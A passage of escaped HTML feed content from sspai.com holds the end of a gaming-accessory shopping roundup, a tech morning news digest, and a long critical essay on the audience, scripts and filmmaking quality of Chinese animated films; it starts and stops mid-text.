还要轻几克。</p>\n<p>耳塞更轻的好处，是能提升长时间佩戴的舒适度，尤其是对于随便就是一两小时的玩游戏来说。我最近经常玩完游戏好一会儿才想起耳机忘了摘，就因为它戴起来够轻，加上舒适度也 OK，总是「无感」到让我忘了它的存在。用它打游戏的声音表现也还不错，毕竟是针对手游专门做的声音调教，脚步声很清晰，听不同方位的脚步也没问题，这对我来说就很足够了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/d80ae32e1bf6791a014f820a2e0e4b28.jpeg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><p>另外，飞智这款耳机使用的是蓝牙 5.0，他们宣称使用的是自研的名为 Foxspeed 技术，无论在苹果或安卓手机上都能保持 60ms 的低延迟。这个低延迟模式在使用过程中，需要手动敲三下右耳塞来开启。我现在一般是用 OPPO 来玩游戏，两周用下来，延迟和信号表现都挺稳的，没遇到过连接不稳定的情况。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/67510\" target=\"_blank\">新玩意 069- 飞智银狐 T1 耳机</a></p>\n<h3>极想 Switch 挎包</h3>\n<p>¥94 <s>原价￥99</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650605369312\" target=\"_blank\">点这买 &gt;</a></p>\n<p>出门在外 Switch 太大不好带？来自极想的这款 Switch 挎包或许可以满足你的日常出门所需，尺寸为 26cm*15cm *6cm，采用了撞色设计，外侧拥有一大一小两个存储空间，透明的立体口袋和变色拉链则为个性设计，刺绣贴也可以根据喜好更换拆卸。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/24a5072a87f41ddf8ef3dbdc9eda7225.jpg\"></figure><h3>极想 神秘国度主题 Switch 配件</h3>\n<p>¥44 <s>原价￥49 起</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650608161875\" target=\"_blank\">点这买 &gt;</a></p>\n<p>极想的一系列 Switch 本体配件使用了埃及元素，比如在主题收纳包上就出现了大家熟悉的象形文字，荷鲁斯之眼镶嵌中间，为金属徽章的工艺，摸起来更为精致。除了收纳包，该系列配件也有保护壳、贴膜以及卡盒可供挑选。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/43f84a0431d16b3e05cc3ce87655ed15.jpg\"></figure><h3>imPoi Switch 手柄可折叠握把</h3>\n<p>¥59 <s>原价￥69</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650518377739\" target=\"_blank\">点这买 &gt;</a></p>\n<p>原版的 Joy-Con 握柄在增加了握持感的同时，异形的设计却不是很便携。如果你有类似困扰，不妨试试这款来自 imPoi 的 Switch 手柄握把，简化到只有左右滑轨结构，真机开模的滑槽丝滑流畅，避免刮花，高强度聚苯乙烯材质带来了细腻精致的手感。此外，还会额外附赠一对硅胶保护套。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/98a19e5e2439bdbe64033ab9b6a4a2ca.jpg\"></figure><h3>计客（GiiKER）超级华容道</h3>\n<p>¥169 <s>原价￥199</s> 详情页领￥20 券后下单</p>\n<p>🛒 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=654000666489\" target=\"_blank\">点这买 &gt;</a>（预售，7 天内发货）</p>\n<p>谁说只有屏幕里的才算游戏？现实生活中的「游戏」可能更加有趣。华容道作为经典的益智玩具陪伴了大家的童年，而这款智能化华容道在现代科技的加持下，让它更加实用好玩。它内置了 500+ 电子题库，通过 LED 屏自动出题，让你循序渐进地轻松上手，采用了感应式棋盘，在你遇到困难的情况下会有教学模式指导解题，搭配 App 可以实现自定义开局，解锁更多玩法。磁吸手感，轻畅顺滑，整体大小也很适合手中把玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/6ed3195ebbf5378bfdb6c64a95616330.jpeg\"></figure><p>🏬 更多优惠折扣，你可以前往少数派 <a href=\"https://sspai.taobao.com/index.htm?spm=a1z10.1-c-s.w5002-22968806688.2.65e51ba85DtxAt\" target=\"_blank\">淘宝店</a> / <a href=\"https://shop11352888.m.youzan.com/wscshop/showcase/homepage?kdt_id=11160720\" target=\"_blank\">有赞店</a> 选购下单。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68450"},{"title":"派早报：北京环球度假区即将开启试运行、Kindle 电子书屏保广告即将下线","date":"2021-08-25 00:35:25","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>北京环球度假区即将开启试运行</h3>\n<p>8 月 24 日，北京环球度假区正式宣布将于今年 9 月 1 日开启试运营。根据疫情防控要求，将在试运营期间实施限流政策。<a href=\"https://mp.weixin.qq.com/s/peZKpYctMoJmJPZHDgWe7A\" target=\"_blank\">来源</a></p>\n<h3>Google 将根据特定市场和用户设备调整应用评级方式</h3>\n<p>8 月 24 日 Google 正式宣布，将调整 Google Play Store 的应用评级方式，相比此前固定评级，Google Play Store 将根据不同的市场和用户手中不同的设备来参与多种评级，如果设备屏幕尺寸不同，所获得评级也不尽相同。Google 计划在11 月份开始针对不同市场设定特定评级，在 2022 年针对平板电脑、可折叠设备、Chrome OS、Wear OS 或 Android Auto 等设备提供不同评级。<a href=\"https://m.ithome.com/html/571074.htm\" target=\"_blank\">来源</a></p>\n<h3>Kindle 电子书屏保广告即将下线</h3>\n<p>8 月 24 日，亚马逊官网发布信息，宣布 Kindle 阅读器即将迎来升级，此次升级仅适用于目前显示中文广告的 Kindle 电子书阅读器，如手中的设备没有显示中文广告，可以忽略此次提醒。本次更新将在 9 月初开始， 持续数周进行推送，屏保广告也将正式退出 Kindle 的舞台。<a href=\"https://www.amazon.cn/gp/b/ref=pe7003082431593792pebtnb/458-3923238-8988320?encoding=UTF8&amp;node=2338519071\" target=\"_blank\">来源</a></p>\n<h3>Oculus Quest 2 升级款现已正式开卖</h3>\n<p>8 月 24 日 Oculus Quest 2升级款现已正式在亚马逊商城开售，价格和此前版本保持一致（299美元），而基础款的存储则从 64GB 容量升级为 128GB，面罩改为硅胶面罩。此前有玩家反馈 Oculus Quest 2 的泡沫面罩存在引发过敏的症状，为此官方也为此前购买 Oculus Quest 2 的用户提供了可免费替换的硅胶面罩。<a href=\"https://www.vgtime.com/topic/1133139.jhtml\" target=\"_blank\">来源</a></p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>据外媒 Windows Latest 报道，Surface Duo 2 将在今年 10 月发布，该设备或将搭载高通骁龙 888 处理器。<a href=\"https://m.ithome.com/html/571072.htm\" target=\"_blank\">来源</a>\n</li>\n<li>微软官方在其 Twitter 账户中分享了一张启用深色模式的 Windows 11 桌面截图，截图中的任务栏中日期显示为 20211021，似乎暗示了该系统正式发布稳定版本的时间，此前有消息称微软将会在今年向部分设备通过 OTA 的形式推送 Windows 11 更新。<a href=\"https://www.cnbeta.com/articles/tech/1170249.htm\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2><strong>少数派的近期动态</strong></h2>\n<ul>\n<li>📈 特惠订阅 + 深度教程，<a href=\"https://sspai.com/item/25\" target=\"_blank\">Microsoft 365 工具升值包</a> 带你进阶学习 Office 使用技巧。</li>\n<li>⌨️ 老牌 Markdown 写作工具 MWeb 更新 4.0 大版本，欢迎前往 <a href=\"https://sspai.com/item/13\" target=\"_blank\">少数派正版软件商城</a> 下单。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog/vol06-pre-toys-for-adults\" target=\"_blank\">大人的玩具</a>》已经上线，来看看乐高与模型的故事，祝你玩得开心。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》上线电商平台，<strong>少数派预购会员将获赠该书</strong>。<a href=\"https://item.jd.com/12914331.html\" target=\"_blank\">5 折下单 &gt;</a>\n</li>\n<li>⭐ 又到开学季，面对学生朋友送点什么好？去 <a href=\"https://sspai.com/bullet/1628500218\" target=\"_blank\">一派</a> 聊聊。</li>\n</ul>\n<h2><strong>你可能错过的文章</strong></h2>\n<ul>\n<li><a href=\"https://sspai.com/post/68408\" target=\"_blank\">AI Day 汇总：特斯拉是一家 AI 机器人公司吗？</a></li>\n<li><a href=\"https://sspai.com/post/68374\" target=\"_blank\">国物馆 | 你应该知道的国产手摇磨豆机</a></li>\n<li><a href=\"https://sspai.com/post/68401\" target=\"_blank\">开学季 | 从通知书包裹到证件照片，做个「有备而来」的新同学</a></li>\n<li><a href=\"https://sspai.com/post/68392\" target=\"_blank\">[送码] 简约而不简单，我做了一个「彩云天气精简版」：白云天气</a></li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68460"},{"title":"中国动画现在的发展如何？","date":"2021-08-24 11:30:09","description":"\n<blockquote>如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</blockquote>\n<p>《大圣归来》在2015年暑期档斩获的9.54亿元票房和因该片而流行开的“自来水”概念，被认为是“国漫崛起”的重要标志（“国漫”这个词将动画与漫画混为一谈，但作为一个已经在大众媒体流传开来的经典误用，本文仅在此使用一次，特此注明）。相比于“昙花一现”的“国产科幻崛起”，仅针对成年观众的国产三维动画长片这一细分门类来说，这六年来创作者与市场给予了一定的持续性正向反馈。如今的大陆电影市场上，国产动画电影是一条热门赛道，不仅是每个档期必备的重要种子选手，催生了如《哪吒：魔童降世》50.35亿元的票房奇迹，甚至已经在特殊档期能够承载“救市”的期待（如今年7月上映的《白蛇2：青蛇劫起》），制片方借助IP实现“电影宇宙”的构建也不再是空谈。</p>\n<p>可以说，国产动画电影这一类型片种在大陆市场上的持续性输出和商业成功是具有开创性的，无论是从横向还是纵向观察，在任何一个电影市场上都是少见的——完全可以说，国产动画电影的发展，正是近年来“讲述中国故事”这一文化路线的实操成果。</p>\n<p>然而，这条赛道越发热门，竞争就越发激烈，每年试图分一杯羹的“炮灰”数不胜数。即使是在市场上得到良好反馈的作品，也不一定满足了创作者和观众热情饱满的期待；对国产动画电影的火爆现状终究会归于沉寂的担忧声音，在每一部“出圈”的动画电影上映时都会响起。实际上，当初业界惊呼“产业崛起”时的高涨情绪，经过六年之后，逐渐被某种流于日常的平庸感所攫取：这一行业和类型到了现在，已经没什么“惊奇”可言。</p>\n<p>虽然作品还在持续不断地推出，票房也都基本达到预期，然而国产动画电影在翻过高山之后，似乎进入到一个波澜不惊的平庸期：目所能及的尝试与突破都已走到尽头，依然信心高涨的创作者们身后，观众和市场仿佛在暗中酝酿一场改换门庭的暗影危机。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d35d24cdab0b0b33fa4ca65c030af6d4_720w.jpg?rss\" data-caption=\"《哪吒之魔童降世》票房破50亿海报。图片：《哪吒之魔童降世》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1422\" data-watermark=\"original\" data-original-src=\"v2-d35d24cdab0b0b33fa4ca65c030af6d4\" data-watermark-src=\"v2-c4c3ae32d0e22e7b4eb10f906e853fea\" data-private-watermark-src=\"v2-88a0884a1d7091f5b1b9664252f0e0b5\"></p>\n<p><b>国产动画电影的受众到底是谁？</b></p>\n<p>这个问题荒谬吗？从票房成绩上来看，也许并不。我们可以列出一张2015年后比较重要的国产动画电影（非针对儿童市场）票房成绩表：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-35faa1cb8d149dd646bdc32f795e951b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"519\" data-rawheight=\"296\" data-watermark=\"original\" data-original-src=\"v2-35faa1cb8d149dd646bdc32f795e951b\" data-watermark-src=\"v2-bba80e118805c27411e15dbcbdff8250\" data-private-watermark-src=\"v2-61f131f4d014c57f30ef9178f3b32de0\"></p>\n<p>一旦我们将针对儿童市场的《熊出没》系列等片排除出考察范围，国产动画电影的票房成绩显示出一个清晰的基本盘：人民币3-6亿。也就是说，如果无法创造全民性的、超越动画电影本身受众范围的“出圈效应”，类似《白蛇》系列这样口碑表现良好的优质IP的最终票房射程大致也就在6亿左右：虽然这个数字在票房整天“放卫星”的大陆市场毫不起眼，但在动画电影类型中已是极佳的成绩，足以支撑追光动画规划自己的“动画宇宙”；毕竟还有更多作品根本无法企及这一数字，比如创造了足够的话题，却因题材限制致使受众无法扩展的《大护法》，又比如在2021年企图借助动画电影风口一飞冲天最终沦为市场失败者的《西游记之再世妖王》（1.13亿）和《济公之降龙降世》（4064万）。</p>\n<p>拨开《哪吒之魔童降世》的“全民神话”，尽管拥有超高的关注度，国产动画电影整体上绝非当今市场特别青睐的类型。真正成功的作品凤毛麟角，想要达到3-6亿的基本盘都得费尽心思，类似《哪吒》和《姜子牙》这样的奇迹基本不可复制（实际上，从《姜子牙》的营销投入和观众的期待值来看，16.02亿的成绩绝非成功）。</p>\n<p>由此可以解释，为何几乎每部在大陆上映的国产动画电影都不可避免地进行“卖惨”式营销，为何每部作品都是制作方砸锅卖铁苦心孤诣，搞得仿佛一旦失败中国动画就将暗无天日似的，哪怕几年下来观众对这样的营销基本脱敏：虽然这些话术都是俗烂的营销手段，但某种意义上也是现实——制片方肯定掌握更加详细的用户大数据信息，他们的结论就是这个市场不太大。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-b5567cb7103e81d1b0cb8b7f7e3e380a_720w.jpg?rss\" data-caption=\"原定于2020年大年初一上映的《姜子牙》与《哪吒之魔童降世》的联动海报。图片：《姜子牙》电影官方微博\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"1161\" data-watermark=\"original\" data-original-src=\"v2-b5567cb7103e81d1b0cb8b7f7e3e380a\" data-watermark-src=\"v2-42e4c131dafba1942f7acee50c96fe93\" data-private-watermark-src=\"v2-5e0de6db510f53068829ed2532acd0ba\"></p>\n<p>其实，也可以从近年重要的国产动画电影的选材和创作风格中，勾勒出受众画像。首先，从来没有人把“喜羊羊”和“熊出没”系列当作国产动画崛起的标志，可见其受众群体并不考虑儿童与他们的家长，而是与日本类似，以热爱动漫的青少年和二次元青年人为主；其次则是与美国动画市场类似，主攻在院线上映的动画长片，从角色设置到剧本结构均以迪士尼为师，受众目标是经常光临影院的青年观影群体；其三，选材和文学基础上具有浓郁的网络文学特质，遵循电子游戏的冒险逻辑，品味和审美较为迎合青年男性（哪怕是以女性做主角）——类似“我命由我不由天”“有朝一日权在手”“天道还是人道”的“中二”式男性幻想往往是国产动画电影文本创作的思想底色。</p>\n<p>有趣的地方是：我们是在勾勒一种类型片的受众吗？不，我们似乎是在精准地筛选出一群特殊而小众的群体。这群人首先有足够的年龄，其次对日式二次元文化有兴趣，又不排斥美国的动画长片文化，又是院线电影的忠实爱好者，既能接受美式三维动画的低龄画风，还热衷于修仙武侠题材的网络文学与中二的成长叙事——这样的用户画像几乎是“缝合怪”，它不是寻找观众的最大公约数，反而是在筛选核心观众，本质上是与尽可能包括所有群体的“合家欢”商业逻辑相违背的。</p>\n<p>理论上，国产动画电影的风格包罗万象，百花齐放，多元性强，似乎是一个尽量包含了动画爱好者所有能够想到的领域的聚合体，但实际上，它却是一个内在元素时常自相矛盾，对观众来说时而新奇莫名，时而一锅乱炖的“弗兰肯斯坦”。单论创新程度，值得鼓励也颇令人疑惑的事实是：国产动画电影的确走出了一条全新的路径，创造出了一套中国大陆独有的动画电影语汇，的确拍摄出了世界罕见，绝对“中国特色”的动画电影。这甚至与观众不完全相关，与制片方的商业规划也不完全符合，甚至追溯到本源，可能和中国最早的那一批动画导演的个人经历与审美有关。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-3efbdefd55f4f61901ceb397b0a5171a_720w.jpg?rss\" data-caption=\"风格颇受宫崎骏影响的《大鱼海棠》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"417\" data-watermark=\"original\" data-original-src=\"v2-3efbdefd55f4f61901ceb397b0a5171a\" data-watermark-src=\"v2-81cd6465e231ca1f4d5f9fe6a6293f41\" data-private-watermark-src=\"v2-aba83795575febc9e3dab4a336ab602f\"></p>\n<p>总的来说，如今的国产动画电影在创作风格上普遍呈现“日美中”三国的混搭，刻薄地说，就是“用中国题材，以美国形式，讲日式二次元故事”。</p>\n<p>其一，国产动画电影的创作者不可避免地有爱好日式二次元的背景，这一背景对创作最大的影响是：否认动画是一种只面向儿童的艺术形式，认为动画可以用来讲述任何年龄段都能欣赏的故事。与此同时，却又因为创作者自身年龄的取向，较为专注于写作青少年的个人成长故事。</p>\n<p>其次，作为在院线上映的电影，从形式上就受到美国动画长片创作风格的影响。首先是剧本写作上的结构式模仿，主打追寻个人价值、认识自我的美式主题诉求与日式成长故事的融合；从人物设置上拷贝美国动画的既有经验，比如必然为主角建设一个跟班小分队，肯定存在一到两个模仿梦工厂动画片的搞笑角色，基本会为主角安排“萌宠”；剧本结构完全按照好莱坞商业电影的三段式逻辑来写作，处处追求“大片”范，最后一幕主角的“重新崛起”已成为固定套路和规范习题；</p>\n<p>值得一提的是，除了少数画风独特的作品，国产动画电影基本采取美国动画电影低龄非真人比例的三维画风，这一选择是否与技术能力和成本控制有关尚有争议（毕竟如今国产单机游戏开发都已普遍使用虚幻4引擎），但却从根本上导致国产动画电影时常以低幼的合家欢画风，表现成熟深刻（抑或是故作深沉的中二伪深度）的故事，无时不在的本质违和感近乎荒谬。</p>\n<p>其三，在多重因素的鼓励下，国产动画电影大都把自身的创作与“国潮”“传播中华传统文化”“讲述中国故事”绑定，自我规定为中国经典神话IP的再创作。《西游记》《封神榜》和《白蛇传》三大源流基本上垄断了目前大多数国产动画电影的选题，导致六年来总数虽不到二十部，但很多人物和故事却已经被反复地、多角度地讲述，观众已经进入疲劳期；而从目前的状况看来，解决疲劳的方式却并不是扩展和拓展题材（哪怕只是寻找其他的中国神话和传统故事），相反是以各种视觉风格和文本解读角度不断重述既有的故事，这一发展方向显然是商业投资人的短视所致。</p>\n<p>回到一开始的问题，这个市场为什么不太大呢？其实，倒不如反问一句：爱好这么独特的“缝合怪”和“创新产物”的受众群体，真的会很大吗？</p>\n<p><img src=\"https://pic3.zhimg.com/v2-48d264004f490b3d6fa23abf8d0eed5f_720w.jpg?rss\" data-caption=\"《姜子牙》中的萌宠“四不像”。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"335\" data-watermark=\"original\" data-original-src=\"v2-48d264004f490b3d6fa23abf8d0eed5f\" data-watermark-src=\"v2-75427e17c2b55f7cbe55b40da321670c\" data-private-watermark-src=\"v2-b32b850a46a69bf06b2ec2408fd6c5fc\"></p>\n<p><b>“剧本医生都不想再见到的程度”</b></p>\n<p>无论是业界还是观众，真正意义上认可国产动画产业的成功，都得从《大圣归来》和《哪吒之魔童降世》算起：国内的舆论环境显然认为在院线上映的电影长片才是“登堂入室”的标准，来自日本的以漫画和电视剧集为主，以“剧场版”“大电影”为辅助的模式并不被国人认可。既然把主战场放在院线，观众必然要以商业电影的标准来看待国产动画电影——那么，六年来我们遇到过几部剧本“合格”，可以被称为“剧本写作”的国产动画电影呢？有一说一，这个数字恐怕不多；虽然整个业界都知道“内容为王”，也绝对不是不重视编剧和剧本质量，每次都和观众保证编剧绝对用心了，然而大多数国产动画电影最后的剧本，恐怕都还是好莱坞的“剧本医生”都不想再见到的程度。</p>\n<p>首要问题是俗套。鉴于我们的题材集中于《西游记》《封神榜》和《白蛇传》这三个IP里，“创意”这个词的定义对国产动画编剧来说显然改变了，从创造变成了阐释，变成对古代故事进行现代解读。可是，为什么几乎每一个剧本的主旨都是寻找自我与自我实现呢？这未免太过于“现代性”了一些，我们的每个主角几乎一开始都不愿意做自己，都遇到了青春期的成长问题，暴躁、易怒、对世界有不一样的理解，满腔反抗精神，拷问自我的价值，从挫折中屡败屡战，寻找人生的解脱道路，并一定在故事的最后“找回了自己”，成为了“标题的那个人”——算了啰嗦了，其实我们的每个主角都是孙悟空，要么是周星驰的，要么是今何在的。</p>\n<p>当然，每部商业电影都存在主角自我实现这一母题，这固然不错，但相较于漫威宇宙采取的“类型片巡礼”路线——以谍战片、战争片、宫廷史诗片、无厘头喜剧片等各种类型来包裹超级英雄内核，国产动画电影这六年来的实践，大多数只选择了动作冒险片，甚至刻薄地说，是武侠偶像剧这唯一的类型路径。主题陈旧，孙悟空整天拷问自我，不知道自己是谁；剧本类型单一，不按“勇者斗恶龙”的冒险模式走就无法展开剧情；大多数时候，观众希望看到令人眼前一亮的故事基本是一种奢求。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e8bec215de14356993f29b53144dd91e_720w.jpg?rss\" data-caption=\"《美国队长2》从剧作上是一部谍战片。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"533\" data-watermark=\"original\" data-original-src=\"v2-e8bec215de14356993f29b53144dd91e\" data-watermark-src=\"v2-f5fa64bf0a03d0d8f8df35210ef79028\" data-private-watermark-src=\"v2-4bd9205911324313a463cd9eb2ab8fd9\"></p>\n<p>然而，哪怕是为了商业诉求上的安全采取既定的动作冒险片模式，兢兢业业完成的话至少不过不失，足以保证电影其他亮点的展现；但部分国产动画电影的剧本写作堪称敷衍，基本只是为了满足套路需求，为事先预设的大场面戏码提供甚至都说不太过去的理由。21世纪以来网络文学的“升级打怪”套路，或者说电子游戏所带来的清关思维取代了基本的情节写作，借自迪士尼的“萌宠”和借自梦工厂的主角团队内部搞笑吐槽互动取代了基本的人物塑造。</p>\n<p>2021年春节档的《新神榜：哪吒重生》被调侃为“靠死人推进剧情”，这个来自“民国蒸汽朋克”世界，开机车的“新哪吒”，连内心挣扎和自我实现戏码都欠奉，整部电影除了依靠亲人受伤和死亡一步步开发“小宇宙”提升战力之外，就不存在心理意义上的“成长”，剧情就是不断铺陈“挫折——变强——挫折——变更强——挫折——变超强”的“逆袭爽剧”，与动作冒险电子游戏的通关过程达成高度的形式一致性，导致电影完全沦为只为展现动作场面和技术能力、毋需观众操作的电子游戏视觉秀。</p>\n<p>其三，剧作的文学能力和审美品位始终未见提升。堪称“全民观影”的《哪吒之魔童降世》存在的最大争议，就是影片中大量“屎尿屁”风格的喜剧笑料。毫无疑问这是创作者针对商业需求所刻意设计的（也相对放大了导演饺子一贯的品味偏好），事实上也取得了前所未有的票房回报，但是商业电影中负责吸引大众的喜剧元素难道一定要是如此“下三路”的吗？</p>\n<p>由于国产动画电影的情节和格调基本脱胎于早期网络文学，一定程度上直观暴露了导演和编剧的文化底蕴。类似《姜子牙》中反复提及却流于平面的“人道还是天道”“如何拯救苍生”，《大圣归来》《新神榜：哪吒重生》中被一唱三叹的“弱者逆袭”“强者归位”，这类连网络文学都开始觉得陈腐的“定番”屡次上演，使得国产动画电影始终难以逃脱“中二”的底色，很难立足于经典故事真正讲出现代的新意，缺乏创作者希望拥有的“深刻”。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9f6d13e8dd9c78ef97ce4c2fda8353ed_720w.jpg?rss\" data-caption=\"《白蛇2：青蛇劫起》中的女性情感刻画。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"450\" data-watermark=\"original\" data-original-src=\"v2-9f6d13e8dd9c78ef97ce4c2fda8353ed\" data-watermark-src=\"v2-b3622c3bfd5a8b2a8cf0f7291f0c775e\" data-private-watermark-src=\"v2-9cd8ba9b100f651dda4c16870511b091\"></p>\n<p>另外，国产动画电影中的女性角色，受到受众需求和创作者个人品味的引导，时常尴尬地使用非真人比例的卡通画风贩卖刻板印象的“软色情”，在女性角色的身材和服装设计上毫不掩饰地展现男性凝视。人物塑造上要么写成工具人，要么以极为可疑的视角来写作女性故事和女性之间的爱恋情感，颇有不真诚地“打女权牌”之嫌——不仅是编剧，国产动画电影创作团队的各个部门都被强烈的男性审美特征所把控，相对缺乏女性创作力量的注入。</p>\n<p>一个就摆在我们面前，但还是令人震惊的现实是：国产动画电影的剧本内容大多数取决于投资人、导演或者技术部门负责人，很少由专业的电影编剧来负责，甚至大多数执笔者也都不是专业编剧。导演往往沉迷对过往成功路径的依赖，不断地重复自己多少年都不熄灭的中二情怀；制片方往往会吹嘘他们是多么关心剧本，但他们往往关心的只是剧本中存在多少之前被市场证明过能够大卖的元素，只在乎剧本能不能顺畅地把技术部门想要画出来的大场面有逻辑（没逻辑也行）地串联起来，只想问编剧创造的角色和台词搞不搞笑，有没有金句爆点，到底像不像迪士尼。</p>\n<p>大部分国产动画电影最终的剧本文本呈现，基本由无数断裂的增删痕迹、被粗暴嵌入的对其他成功作品的模仿、白开水般交作业式的剧情对话，以及编剧最终放弃逻辑的沉默呐喊所构成。无论怎样的主题素材，何种人物和故事背景，最终都拍成了“孙悟空传”，都被串联为一个“搞笑角色在主角小分队中不断插科打诨的超级英雄动作冒险故事”（谁能想到《姜子牙》也能是一个超级英雄个人冒险故事？）：</p>\n<p>打败拦路的敌人，变得更强，找到自己，拯救苍生，观众和导演的中二病都在影片中被狠狠地满足了，而被宣传吸引进电影院的路人观众，没能与国产动画电影的经典青春期少男中二气质对上焦，观影过后满腔怒火地在社交网站上吐槽情节和剧本。这些声音，在一片“有笑有泪”“国产动画崛起”的呼声中往往显得特别孤单可笑，到头来不得不无奈地感叹：</p>\n<p>原来中国动画就是这样的啊？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a9d92c559bfbd12520cee14e06bb7d79_720w.jpg?rss\" data-caption=\"梦工厂出品《怪物史莱克》的主角团队角色设置成为广泛被模仿的定则。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-a9d92c559bfbd12520cee14e06bb7d79\" data-watermark-src=\"v2-f4fa86481a5e907537153ff92295dab7\" data-private-watermark-src=\"v2-6ca6ad03293678b47af22a9c17862b1f\"></p>\n<p><b>他们到底讲的是“中国故事”吗？</b></p>\n<p>剧本的孱弱与失控只是国产动画电影制作全景中的一个缩影，它暴露的是制片方对“电影”这一艺术形式本体尊严的漠视：选择拍摄电影长片只是为了利润最大化，然而电影制作本身是有门槛的，甚至，剧本创作的门槛可能是其中最低的。当下国产动画电影的制作团队成员里有多少出身于“电影”而不是“动画”的呢？事实是，大多数创作者都是动画制作出身，哪怕厂商从好莱坞挖来的一线人才也基本都来自技术与特效部门，缺乏导演和独立创作经验——对他们来说，“电影”只是在把动画短片拉长而已。</p>\n<p>习惯于真人长片，有一定阅片量的电影观众，经常会在国产动画电影中看到匪夷所思的、教科书反例般的剪辑事故与运镜失误，其镜头语言的匮乏与低劣甚至远不如大多数电视连续剧。六年过去，国产动画电影的“电影质感”进步缓慢，始终处在极低的档次上，“观之不似电影”。电影作为一门视觉艺术，其视觉冲击力绝不仅仅是某些“大场面”，伴随迪士尼风格的甜腻画风，镜头语言的粗劣更是放大了观影的不适感，某种意义上，进一步加深了路人观众“这还是给小孩子看的”的误解。</p>\n<p>我们相信，上述误解是任何一个国产动画电影创作者都希望彻底破除的，但他们可能以为把剧本写得“黑深残”就能解决，而遗忘了以镜头语言为代表的一系列有关摄影、剪辑、音效、音乐等本质属于“电影”范畴的技术问题。作为对比，国产商业电影历经几十年的淬炼，已经逐渐普及了基础的电影制作“行活”，但很明显，与电影人完全不在一个赛道上的动画人，似乎没有真正意识到“电影”意味着什么。</p>\n<p>2015年以来的国产动画产量和票房的崛起，离不开国家文化政策对动漫产业的鼓励与扶持，实际上创作者们也异常自觉地将创作主题集中于传统文化题材，自觉地把自身与“国潮”“讲述中国故事”绑定，始终坚持站在“古风”亚文化的风口。由此可见，说他们沉溺于过往经验、故步自封是不公正的，显然他们足够审时度势，知道要把有限的力气花在哪里——与其下功夫提升观众一时半会看不出来的电影制作水准，不如将精力花在最惹人注意的题材和IP上，视觉和剧本只要以公认世界顶级的迪士尼为尊就不会出错；投资人和创作者固然如此精明，但值得反思的问题是，六年来，国产动画电影虽然基本都是国风题材，可是他们真的“讲述中国故事”了吗？</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e729ab88157a63694f80a0423c3584d_720w.jpg?rss\" data-caption=\"迪士尼经典动画电影《花木兰》剧照。图片：豆瓣电影\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"600\" data-watermark=\"original\" data-original-src=\"v2-7e729ab88157a63694f80a0423c3584d\" data-watermark-src=\"v2-4704b3d05b8124e3eb420dc864d55579\" 